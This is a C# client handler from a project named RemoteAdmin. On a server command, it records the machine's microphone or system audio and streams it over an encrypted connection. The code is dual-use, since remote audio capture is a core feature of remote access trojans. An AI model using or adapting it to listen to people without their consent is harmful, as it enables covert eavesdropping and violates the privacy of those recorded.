using System;
using System.Linq;
using System.Net.Security;
using System.Threading;
using System.Threading.Tasks;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Client.Handlers
{
    internal class AudioStreamHandler
    {
        private static WaveInEvent _microphoneCapture;
        private static WasapiLoopbackCapture _systemAudioCapture;
        private static SslStream _stream;
        private static bool _isMicStreaming;
        private static bool _isSystemAudioStreaming;
        private static long _micSequenceNumber;
        private static long _systemSequenceNumber;
        private static readonly object _micLock = new object();
        private static readonly object _systemLock = new object();

        public static async Task HandleStartAudioStream(SslStream stream, StartAudioStreamMessage msg)
        {
            if (msg.SourceType == AudioSourceType.Microphone)
            {
                await StartMicrophoneStreaming(stream, msg.SampleRate, msg.Channels);
            }
            else if (msg.SourceType == AudioSourceType.SystemAudio)
            {
                await StartSystemAudioStreaming(stream);
            }
        }

        private static async Task StartMicrophoneStreaming(SslStream stream, int sampleRate, int channels)
        {
            lock (_micLock)
            {
                if (_isMicStreaming)
                    return;
            }

            _stream = stream;
            _micSequenceNumber = 0;

            try
            {
                // Check if any recording device is available
                if (WaveInEvent.DeviceCount == 0)
                {
                    throw new InvalidOperationException("No microphone devices found");
                }

                // Try to use the requested format, but fall back to device default if needed
                WaveFormat actualFormat;
                try
                {
                    actualFormat = new WaveFormat(sampleRate, 16, channels);
                }
                catch
                {
                    // Fall back to common format
                    actualFormat = new WaveFormat(44100, 16, 1);
                    Console.WriteLine($"Requested format not supported, using: {actualFormat.SampleRate}Hz, {actualFormat.Channels} channel(s)");
                }

                _microphoneCapture = new WaveInEvent
                {
                    DeviceNumber = 0, // Use default device
                    WaveFormat = actualFormat,
                    BufferMilliseconds = 100
                };

                _microphoneCapture.DataAvailable += OnMicrophoneDataAvailable;
                _microphoneCapture.RecordingStopped += OnMicrophoneRecordingStopped;

                lock (_micLock)
                {
                    _isMicStreaming = true;
                }

                _microphoneCapture.StartRecording();

                // Send actual format back to server
                try
                {
                    await NetworkHelper.SendMessageAsync(_stream, new AudioFormatMessage
                    {
                        SourceType = AudioSourceType.Microphone,
                        SampleRate = actualFormat.SampleRate,
                        Channels = actualFormat.Channels,
                        BitsPerSample = actualFormat.BitsPerSample
                    });
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to send format message: {ex.Message}");
                    StopMicrophoneStreaming();
                    throw;
                }

                Console.WriteLine($"Started microphone streaming: {actualFormat.SampleRate}Hz, {actualFormat.Channels}ch, {actualFormat.BitsPerSample}bit");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting microphone: {ex.Message}");

                lock (_micLock)
                {
                    _isMicStreaming = false;
                }

                try
                {
                    await NetworkHelper.SendMessageAsync(stream, new OperationResultMessage
                    {
                        Success = false,
                        Message = $"Failed to start microphone: {ex.Message}"
                    });
                }
                catch
                {
                    // Ignore if we can't send error message
                }
            }
        }

        private static void OnMicrophoneDataAvailable(object sender, WaveInEventArgs args)
        {
            bool isStreaming;
            SslStream currentStream;

            lock (_micLock)
            {
                isStreaming = _isMicStreaming;
                currentStream = _stream;
            }

            if (!isStreaming || currentStream == null)
                return;

            try
            {
                var capture = sender as WaveInEvent;
                if (capture == null)
                    return;

                var audioMessage = new AudioChunkMessage
                {
                    AudioData = args.Buffer.Take(args.BytesRecorded).ToArray(),
                    SourceType = AudioSourceType.Microphone,
                    SampleRate = capture.WaveFormat.SampleRate,
                    Channels = capture.WaveFormat.Channels,
                    BitsPerSample = capture.WaveFormat.BitsPerSample,
                    SequenceNumber = Interlocked.Increment(ref _micSequenceNumber)
                };

                // Send synchronously in background to avoid blocking audio capture
                Task.Run(async () =>
                {
                    try
                    {
                        // Check if still streaming before sending
                        lock (_micLock)
                        {
                            if (!_isMicStreaming || _stream == null)
                                return;
                        }

                        await NetworkHelper.SendMessageAsync(currentStream, audioMessage);
                    }
                    catch (ObjectDisposedException)
                    {
                        // Stream was disposed, stop streaming
                        Console.WriteLine("Stream disposed during microphone send, stopping...");
                        StopMicrophoneStreaming();
                    }
                    catch (System.IO.IOException ioEx)
                    {
                        // Connection error - stop streaming immediately
                        Console.WriteLine($"Connection lost during microphone send: {ioEx.Message}");
                        StopMicrophoneStreaming();
                    }
                    catch (System.Net.Sockets.SocketException sockEx)
                    {
                        // Socket error - stop streaming immediately
                        Console.WriteLine($"Socket error during microphone send: {sockEx.Message}");
                        StopMicrophoneStreaming();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error sending microphone data: {ex.Message}");
                        // For any other error, also stop to prevent spam
                        StopMicrophoneStreaming();
                    }
                }).ConfigureAwait(false);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing microphone data: {ex.Message}");
            }
        }

        private static void OnMicrophoneRecordingStopped(object sender, StoppedEventArgs e)
        {
            if (e.Exception != null)
            {
                Console.WriteLine($"Microphone recording stopped with error: {e.Exception.Message}");
            }
        }

        private static async Task StartSystemAudioStreaming(SslStream stream)
        {
            lock (_systemLock)
            {
                if (_isSystemAudioStreaming)
                    return;
            }

            _stream = stream;
            _systemSequenceNumber = 0;

            try
            {
                // Use WASAPI loopback to capture system audio
                _systemAudioCapture = new WasapiLoopbackCapture();

                var format = _systemAudioCapture.WaveFormat;
                Console.WriteLine($"System audio format: {format.SampleRate}Hz, {format.Channels}ch, {format.BitsPerSample}bit, {format.Encoding}");

                _systemAudioCapture.DataAvailable += OnSystemAudioDataAvailable;
                _systemAudioCapture.RecordingStopped += OnSystemAudioRecordingStopped;

                lock (_systemLock)
                {
                    _isSystemAudioStreaming = true;
                }

                _systemAudioCapture.StartRecording();

                // Send actual format to server
                try
                {
                    await NetworkHelper.SendMessageAsync(_stream, new AudioFormatMessage
                    {
                        SourceType = AudioSourceType.SystemAudio,
                        SampleRate = format.SampleRate,
                        Channels = format.Channels,
                        BitsPerSample = format.BitsPerSample
                    });
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Failed to send format message: {ex.Message}");
                    StopSystemAudioStreaming();
                    throw;
                }

                Console.WriteLine("Started system audio streaming");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error starting system audio capture: {ex.Message}");

                lock (_systemLock)
                {
                    _isSystemAudioStreaming = false;
                }

                try
                {
                    await NetworkHelper.SendMessageAsync(stream, new OperationResultMessage
                    {
                        Success = false,
                        Message = $"Failed to start system audio: {ex.Message}"
                    });
                }
                catch
                {
                    // Ignore if we can't send error message
                }
            }
        }

        private static void OnSystemAudioDataAvailable(object sender, WaveInEventArgs args)
        {
            bool isStreaming;
            SslStream currentStream;

            lock (_systemLock)
            {
                isStreaming = _isSystemAudioStreaming;
                currentStream = _stream;
            }

            if (!isStreaming || currentStream == null)
                return;

            try
            {
                var capture = sender as WasapiLoopbackCapture;
                if (capture == null)
                    return;

                var audioMessage = new AudioChunkMessage
                {
                    AudioData = args.Buffer.Take(args.BytesRecorded).ToArray(),
                    SourceType = AudioSourceType.SystemAudio,
                    SampleRate = capture.WaveFormat.SampleRate,
                    Channels = capture.WaveFormat.Channels,
                    BitsPerSample = capture.WaveFormat.BitsPerSample,
                    SequenceNumber = Interlocked.Increment(ref _systemSequenceNumber)
                };

                // Send synchronously in background to avoid blocking audio capture
                Task.Run(async () =>
                {
                    try
                    {
                        // Check if still streaming before sending
                        lock (_systemLock)
                        {
                            if (!_isSystemAudioStreaming || _stream == null)
                                return;
                        }

                        await NetworkHelper.SendMessageAsync(currentStream, audioMessage);
                    }
                    catch (ObjectDisposedException)
                    {
                        // Stream was disposed, stop streaming
                        Console.WriteLine("Stream disposed during system audio send, stopping...");
                        StopSystemAudioStreaming();
                    }
                    catch (System.IO.IOException ioEx)
                    {
                        // Connection error - stop streaming immediately
                        Console.WriteLine($"Connection lost during system audio send: {ioEx.Message}");
                        StopSystemAudioStreaming();
                    }
                    catch (System.Net.Sockets.SocketException sockEx)
                    {
                        // Socket error - stop streaming immediately
                        Console.WriteLine($"Socket error during system audio send: {sockEx.Message}");
                        StopSystemAudioStreaming();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error sending system audio data: {ex.Message}");
                        // For any other error, also stop to prevent spam
                        StopSystemAudioStreaming();
                    }
                }).ConfigureAwait(false);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing system audio data: {ex.Message}");
            }
        }

        private static void OnSystemAudioRecordingStopped(object sender, StoppedEventArgs e)
        {
            if (e.Exception != null)
            {
                Console.WriteLine($"System audio recording stopped with error: {e.Exception.Message}");
            }
        }

        public static void HandleStopAudioStream(StopAudioStreamMessage msg)
        {
            if (msg.SourceType == AudioSourceType.Microphone)
            {
                StopMicrophoneStreaming();
            }
            else if (msg.SourceType == AudioSourceType.SystemAudio)
            {
                StopSystemAudioStreaming();
            }
        }

        private static void StopMicrophoneStreaming()
        {
            lock (_micLock)
            {
                _isMicStreaming = false;
            }

            if (_microphoneCapture != null)
            {
                try
                {
                    _microphoneCapture.DataAvailable -= OnMicrophoneDataAvailable;
                    _microphoneCapture.RecordingStopped -= OnMicrophoneRecordingStopped;
                    _microphoneCapture.StopRecording();
                    _microphoneCapture.Dispose();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stopping microphone: {ex.Message}");
                }
                finally
                {
                    _microphoneCapture = null;
                }
            }

            // Don't clear _stream here as it might still be used by system audio
            Console.WriteLine("Stopped microphone streaming");
        }

        private static void StopSystemAudioStreaming()
        {
            lock (_systemLock)
            {
                _isSystemAudioStreaming = false;
            }

            if (_systemAudioCapture != null)
            {
                try
                {
                    _systemAudioCapture.DataAvailable -= OnSystemAudioDataAvailable;
                    _systemAudioCapture.RecordingStopped -= OnSystemAudioRecordingStopped;
                    _systemAudioCapture.StopRecording();
                    _systemAudioCapture.Dispose();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error stopping system audio: {ex.Message}");
                }
                finally
                {
                    _systemAudioCapture = null;
                }
            }

            Console.WriteLine("Stopped system audio streaming");
        }

        /// <summary>
        /// Force stop all audio streaming (useful when connection is lost)
        /// </summary>
        public static void StopAllAudioStreams()
        {
            Console.WriteLine("Force stopping all audio streams...");
            StopMicrophoneStreaming();
            StopSystemAudioStreaming();

            lock (_micLock)
            {
                _stream = null;
            }
        }
    }
}